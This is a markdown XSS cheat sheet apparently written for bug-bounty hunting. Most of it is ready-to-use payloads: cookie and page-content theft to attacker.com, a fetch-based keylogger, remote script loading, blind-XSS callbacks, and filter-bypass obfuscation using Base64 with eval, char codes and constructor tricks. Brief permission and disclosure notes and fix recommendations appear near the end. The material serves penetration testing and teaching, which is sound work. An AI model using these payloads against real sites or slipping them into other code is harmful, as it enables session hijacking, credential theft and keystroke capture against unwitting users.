


# 🎯 XSS Cheat Sheet 

> A complete guide for finding, exploiting, and bypassing XSS vulnerabilities

---

## 📋 Table of Contents
1. [What is XSS?](#what-is-xss)
2. [XSS Types](#xss-types)
3. [Methodology - How to Find XSS](#methodology---how-to-find-xss)
4. [Contexts - Where Your Input Appears](#contexts---where-your-input-appears)
5. [Basic Payloads](#basic-payloads)
6. [Filter Bypasses](#filter-bypasses)
7. [Advanced Techniques](#advanced-techniques)
8. [Blind XSS](#blind-xss)
9. [Quick Reference](#quick-reference)

---

## 🔰 What is XSS?

**XSS (Cross-Site Scripting)** = Injecting malicious JavaScript into a website that runs in other users' browsers.

### What can attackers do?
```
✅ Steal cookies/sessions
✅ Steal personal data
✅ Redirect users to fake sites
✅ Log keystrokes (keylogger)
✅ Deface websites
✅ Perform actions as the victim
```

---

## 🔍 XSS Types

| Type | How it works | Example |
|------|-------------|---------|
| **Reflected XSS** | Payload in URL → reflected in response → executes when victim clicks link | `site.com/search?q=<script>alert(1)</script>` |
| **Stored XSS** | Payload saved in database → executes for every visitor | Comment: `<img src=x onerror=alert(1)>` |
| **DOM XSS** | Payload processed by JavaScript in browser (no server involvement) | `location.hash` → `eval()` |

---

## 🎯 Methodology - How to Find XSS

### Step 1: Find Input Points
```
✅ URL parameters: ?id=, ?search=, ?name=
✅ POST data: forms, login, comments
✅ Headers: User-Agent, Referer, X-Forwarded-For
✅ Cookies: session, preferences
✅ File uploads: SVG, PDF, images
```

### Step 2: Test for Reflection
```
1. Enter unique value: XYZ123TEST
2. View page source (Ctrl+U)
3. Search for "XYZ123TEST"
4. If found → potential XSS!
```

### Step 3: Identify Context
```
Where does your input appear?

📄 Raw HTML: <div>YOUR_INPUT</div>
🏷️  Attribute: <input value="YOUR_INPUT">
💻 JavaScript: <script>var x = "YOUR_INPUT"</script>
🌐 DOM: location.hash, document.write()
```

### Step 4: Test Basic Payload
```html
<!-- Try these one by one -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
```

### Step 5: Escalate to Real Impact
```javascript
// Instead of alert(1), steal data:
<img src=x onerror="location='https://attacker.com/?c='+document.cookie">

// Or send silently:
<script>fetch('https://attacker.com/log',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

---

## 🧩 Contexts - Where Your Input Appears

### 📄 Context 1: Raw HTML
```html
<!-- Your input here: <div>INPUT</div> -->

✅ Payloads:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">

✅ Bypass tricks:
<ScRiPt>alert(1)</ScRiPt>          <!-- Case change -->
<scr<script>ipt>alert(1)</script>  <!-- Double tag -->
<svg/onload%09=alert(1)>           <!-- Tab instead of space -->
```

### 🏷️ Context 2: Inside HTML Attribute
```html
<!-- Your input here: <input value="INPUT"> -->

✅ Escape the attribute:
" autofocus onfocus=alert(1) x="
' onmouseover=alert(1) x='

✅ Use javascript: protocol:
<a href="javascript:alert(1)">Click</a>

✅ Encode to bypass:
<a href="&#106;avascript:alert(1)">  <!-- HTML Decimal -->
<a href="jav&#x61script:alert(1)">   <!-- HTML Hex -->
```

### 💻 Context 3: Inside JavaScript
```javascript
// Your input here: <script>var x = "INPUT"</script>

✅ Break the string:
';alert(1)//
"-alert(1)-"
\';alert(1)//

✅ Escape </script>:
</script><img src=1 onerror=alert(1)>

✅ Template literals (if using ``):
${alert(1)}
`;alert(1)}${`

✅ Unicode encoding:
\u0061lert(1)  // = alert(1)
```

### 🌐 Context 4: DOM-Based
```javascript
// Dangerous sources:
location.href, location.hash, document.URL
document.referrer, window.name

// Dangerous sinks:
eval(), setTimeout(), innerHTML, document.write()

✅ Payload via hash:
#<img src=x onerror=alert(document.cookie)>

✅ Payload via search:
?name=<svg onload=fetch`//attacker.com?c=${document.cookie}`>
```

---

## 💥 Basic Payloads 

### 🔹 Simple Test
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### 🔹 Steal Cookies
```javascript
<img src=x onerror="location='https://attacker.com/?c='+document.cookie">
<script>new Image().src="https://attacker.com/?c="+document.cookie</script>
<script>fetch('https://attacker.com/log',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

### 🔹 Steal Page Content
```javascript
<script>
fetch('/secret-page')
  .then(r=>r.text())
  .then(t=>fetch('https://attacker.com/log?d='+btoa(t)))
</script>
```

### 🔹 Keylogger (Simple)
```javascript
<script>
document.onkeypress=function(e){
  fetch('https://attacker.com/k?k='+String.fromCharCode(e.which))
}
</script>
```

### 🔹 Redirect Victim
```javascript
<script>location='https://fake-login.com'</script>
```

---

# 🚫 Filter Bypasses

### 🔤 Bypass Character Filters

| Blocked | Bypass |
|---------|--------|
| `<script>` | `<ScRiPt>`, `<svg>`, `<img>`, `<body>` |
| `()` | `alert\`1\``, `onerror=alert;throw 1` |
| `'` or `"` | `&#x27;`, `&quot;`, `%27`, `%22` |
| Space | `%09` (tab), `%0A` (newline), `/`, `/**/` |
| `.` in `document.cookie` | `document&period;cookie` |
| `alert` | `String.fromCharCode(97,108,101,114,116)`, `atob('YWxlcnQ=')` |

### 🔣 Encoding Tricks

```javascript
// HTML Entities
&#x27;alert(1)&#x27;    // Single quotes
&#x3C;script&#x3E;     // <script>

// URL Encoding
%3Cscript%3Ealert(1)%3C/script%3E

// Unicode
\u0061\u006c\u0065\u0072\u0074(1)  // alert(1)

// Hex / Octal
\x61\x6c\x65\x72\x74(1)   // Hex
\141\154\145\162\164(1)   // Octal

// Base64 + eval
eval(atob('YWxlcnQoMSk='))  // = alert(1)
```

### 🎭 Bypass Word Blacklists

```javascript
// Split strings
"ale"+"rt(1)"
"con"+"firm(1)"

// Build with char codes
String.fromCharCode(97,108,101,114,116)(1)

// Access via bracket notation
window['al'+'ert'](1)
top[/al/.source+/ert/.source](1)

// Use numbers + toString
8680439..toString(30)  // = "confirm"
983801..toString(36)   // = "alert"
```

### 🔄 Bypass Parentheses `()`

```javascript
// Backticks (template literals)
alert`1`
fetch`https://attacker.com/?c=${document.cookie}`

// Error handler
onerror=alert;throw 1
window.onerror=eval;throw"=alert(1)"

// Array methods
[1].find(alert)
[document.cookie].map(fetch)

// Reflect.apply
Reflect.apply.call`${alert}${window}${[1]}`

// valueOf / toString trick
valueOf=alert;window+''
```

---

## 🌟 Advanced Techniques

### 🔹 No Parentheses + No Backticks
```javascript
// Error handler + throw
1+1;onerror=alert;throw 1

// Ternary operator
1'?(location=`//attacker.com?c=${document.cookie}`):'1

// constructor + atob + Base64
[].filter.constructor(atob('BASE64_HERE'))()
```

### 🔹 Regex Bypass 
```
Regex: /^\d+[\+|\-|\*|\/]\d+/

✅ Payload format: [math] + [separator] + [code]

1+1-alert`1`
2*3;fetch`https://attacker.com/?c=${document.cookie}`
5-2;onerror=alert;throw 1
```

### 🔹 Blind XSS (No Visual Feedback)
```html
<!-- Use external callback services -->
"><script src="https://YOUR-ID.oastify.com/x.js"></script>
<img src=x onerror="fetch(`https://YOUR-ID.oastify.com/?c=${document.cookie}`)">
<input onfocus=eval(atob(this.id)) id="BASE64_PAYLOAD" autofocus>
```

**Services to use:**
- Burp Collaborator
- webhook.site
- interact.sh
- xsshunter.com (self-hosted)

### 🔹 SVG File XSS
```svg
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch(`//attacker.com?c=${document.cookie}`)</script>
</svg>
```

### 🔹 AngularJS / Template Injection
```javascript
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('fetch("//attacker.com?c="+document.cookie)')()}}

// With HTML entity bypass for quotes:
{{constructor.constructor(&#x27;alert(1)&#x27;)()}}
```

---

## 🧰 Tools to Help You

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept/modify requests, Repeater, Scanner |
| **Browser DevTools** | View source, debug JS, network monitoring |
| **Dalfox** | Fast XSS scanner (Go-based) |
| **XSSStrike** | Smart payload generator |
| **webhook.site** | Receive callbacks for Blind XSS |
| **PayloadsAllTheThings** | Huge payload library on GitHub |

---

## 📝 Quick Reference Card

```
🔎 FIND:
1. Test all inputs (URL, form, header, cookie, file)
2. Enter XYZ123TEST → search in page source
3. Identify context: HTML / Attribute / JS / DOM

🎯 EXPLOIT:
Raw HTML:     <script>alert(1)</script>
Attribute:    " onfocus=alert(1) x="
JS String:    ';alert(1)//
DOM:          #<img src=x onerror=alert(1)>

🚫 BYPASS:
No ()?        → alert`1` or onerror=alert;throw 1
No '?         → &#x27; or %27
No script?    → <svg>, <img>, <body>, <iframe>
Filtered?     → Encode: Unicode, Hex, Base64, HTML entities

💥 IMPACT:
Test:         alert(1)
Steal cookie: location='//attacker.com/?c='+document.cookie
Silent send:  fetch('//attacker.com/log',{body:document.cookie,mode:'no-cors'})
Keylogger:    document.onkeypress=e=>fetch('//attacker.com/k?'+e.key)

🔁 BLIND XSS:
"><script src="//YOUR-ID.oastify.com/x.js"></script>
<img src=x onerror="fetch(`//YOUR-ID.oastify.com/?c=${document.cookie}`)">
```

---

## ⚠️ Important Notes

```
✅ Always test with alert(1) first
✅ Use console.log() instead of alert() for stored XSS (no popup)
✅ Use alert(document.domain) to know execution scope
✅ Encode payloads when injecting via URL
✅ Document every step for reporting

❌ Don't use on real sites without permission
❌ Don't steal real user data during testing
❌ Don't skip responsible disclosure
```

---

## 📤 Reporting Template (Simple)

```markdown
## Title
[Reflected/Stored/DOM] XSS in [feature] at [URL]

## Steps to Reproduce
1. Go to: [URL]
2. Input payload in: [parameter/field]
3. Payload: [your payload]
4. Result: JavaScript executes, shown by [alert/cookie steal/etc]

## Impact
- Attacker can steal user sessions
- Can perform actions as victim
- Can redirect to phishing pages

## Fix Recommendations
1. Encode output based on context (HTML/JS/Attribute)
2. Use Content-Security-Policy header
3. Set HttpOnly flag on session cookies
4. Validate and sanitize all user inputs
```

---

## 🎁 Bonus: One-Liner Payloads

```javascript
// All in one line, no spaces, no ()
1+1-alert`1`
1+1-fetch`//attacker.com/?c=${document.cookie}`
1+1;onerror=alert;throw 1
1'?(location=`//attacker.com?c=${document.cookie}`):'1

// With Base64 bypass
[].filter.constructor(atob('BASE64'))()

// jQuery present?
$.getScript`//attacker.com/xss.js`
```

---

## XSS resources:

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
- file:///E:/Bug%20Bounty/5-Client-Side/xss-cheatsheet.html

